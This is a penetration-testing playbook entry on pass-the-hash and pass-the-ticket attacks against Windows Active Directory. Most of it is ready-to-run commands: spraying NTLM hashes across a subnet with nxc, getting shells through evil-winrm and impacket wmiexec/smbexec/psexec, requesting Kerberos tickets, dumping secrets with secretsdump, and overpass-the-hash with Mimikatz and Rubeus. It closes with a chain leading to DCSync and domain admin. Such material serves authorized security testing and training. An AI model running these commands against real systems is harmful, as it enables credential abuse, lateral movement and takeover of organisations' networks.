---
id: pass-the-hash
title: Pass the Hash / Ticket
stage: foothold
tags: [windows, ad]
summary: Authenticate with an NTLM hash or Kerberos ticket instead of a plaintext password — every hash you dump should be sprayed across the subnet immediately.
leads_to:
  - token-impersonation
  - bloodhound
  - dcsync
  - winrm
  - rdp-access
  - smb-lateral-movement
---

## Prerequisites

An NTLM hash from secretsdump, SAM dump, NTLM relay, or DCSync. For pass-the-ticket: a `.ccache` file from getTGT or ticket extraction. SMB/WinRM/RPC accessible on the target.

NTLM authentication uses the hash directly — the plaintext password is never required. Every hash you obtain should be sprayed immediately across all hosts before you do anything else. `nxc smb` with `--local-auth` catches local Administrator password reuse across the entire subnet, which is one of the fastest lateral movement paths in AD environments.

## Quick Win

> evil-winrm with the hash — "Pwn3d!" from nxc first to confirm it works.

```bash
nxc smb $TARGET -u Administrator -H $NTLM --local-auth
evil-winrm -i $TARGET -u Administrator -H $NTLM
```

## Tool Priority

> Try in this order — evil-winrm is most interactive, psexec is noisiest and often AV-flagged.

```bash
evil-winrm -i $TARGET -u $USER -H $NTLM
impacket-wmiexec $USER@$TARGET -hashes :$NTLM
impacket-smbexec $USER@$TARGET -hashes :$NTLM
impacket-psexec $USER@$TARGET -hashes :$NTLM
```

## Spray Hash Across Subnet

> Run this immediately after getting any hash — catches every host where it's valid.

```bash
# Domain context
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM

# Local admin context (catches password reuse across workstations)
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM --local-auth
```

## Pass the Ticket (Kerberos)

> Exchange an NTLM hash for a Kerberos TGT — required for targets that enforce Kerberos-only auth.

```bash
impacket-getTGT $DOMAIN/user:password -dc-ip $DC_IP
impacket-getTGT $DOMAIN/user -hashes :$NTLM -dc-ip $DC_IP
export KRB5CCNAME=user.ccache
impacket-psexec $DOMAIN/user@target -k -no-pass
impacket-wmiexec $DOMAIN/user@target -k -no-pass
impacket-secretsdump $DOMAIN/user@target -k -no-pass
```

## Overpass the Hash (NTLM → TGT)

> Convert an NTLM hash into a Kerberos TGT from inside Windows — avoids NTLM-blocked paths.

```powershell
# Mimikatz
sekurlsa::pth /user:Administrator /domain:$DOMAIN /ntlm:$NTLM /run:powershell.exe

# Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:$NTLM /ptt
```

## Leads To

Local admin hash → shell on target → `whoami /priv` → SeImpersonatePrivilege → SYSTEM. Domain admin hash → DCSync via `impacket-secretsdump` → dump all domain hashes → domain-admin. Hash valid on multiple hosts → spray → lateral movement across subnet. DA hash or machine account hash → BloodHound shows all attack paths from here.
